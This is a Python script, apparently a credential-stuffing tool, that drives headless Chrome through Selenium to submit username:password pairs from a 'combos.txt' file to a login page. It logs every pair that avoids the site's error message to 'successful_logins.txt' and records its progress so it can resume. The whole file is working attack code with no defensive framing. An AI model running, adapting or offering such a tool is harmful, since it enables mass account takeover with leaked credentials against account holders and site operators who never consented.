from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

import time
from colorama import Fore, Back, Style
from colorama import init
from concurrent.futures import ThreadPoolExecutor
import os

init(autoreset=True)

# Function to create a WebDriver without a proxy
def create_driver():
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    driver_path = 'PATH TO THE DRIVER'
    service = Service(executable_path=driver_path)
    driver = webdriver.Chrome(service=service, options=chrome_options)
    return driver

# Function to test login combinations
def test_login(username, password):
    driver = create_driver()
    try:
        driver.get('https://Exemple.com/login')
        time.sleep(1)  # Reduce sleep time

        # Find the input fields for email and password
        username_field = driver.find_element(By.XPATH, '//input[@placeholder="User Name*"]')
        password_field = driver.find_element(By.XPATH, '//input[@placeholder="Password*"]')

        # Enter the login data
        username_field.send_keys(username)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)  # Press Enter to submit the form

        time.sleep(2)  # Reduce sleep time

        # Check if the login was successful
        if "These credentials do not match our records." not in driver.page_source:
            print(Fore.GREEN + f"Successfully logged in with username: {username} and password: {password}")
            # Open a file to write the successful login credentials
            with open("successful_logins.txt", "a", encoding="utf-8") as success_file:
                success_file.write(f"Username: {username}, Password: {password}\n")
        else:
            print(Fore.RED + f"Échec de la connexion pour {username}")
    except Exception as e:
        print(f"Une erreur est survenue pour {username}: {str(e)}")
    finally:
        driver.quit()
        # Save progress
        with open("progress.txt", "a", encoding="utf-8") as progress_file:
            progress_file.write(f"{username}:{password}\n")

# Read the combinations from a file
with open("combos.txt", "r", encoding="utf-8") as file:
    combos = []
    for line in file:
        parts = line.strip().split(':')
        if len(parts) == 2:
            combos.append(parts)

# Read the progress file to get the list of already checked combinations
if os.path.exists("progress.txt"):
    with open("progress.txt", "r", encoding="utf-8") as progress_file:
        checked_combos = set(line.strip() for line in progress_file)
else:
    checked_combos = set()

# Filter out the already checked combinations
combos_to_check = [combo for combo in combos if f"{combo[0]}:{combo[1]}" not in checked_combos]

# Use ThreadPoolExecutor to test logins in parallel
with ThreadPoolExecutor(max_workers=1) as executor:
    for username, password in combos_to_check:
        executor.submit(test_login, username, password)
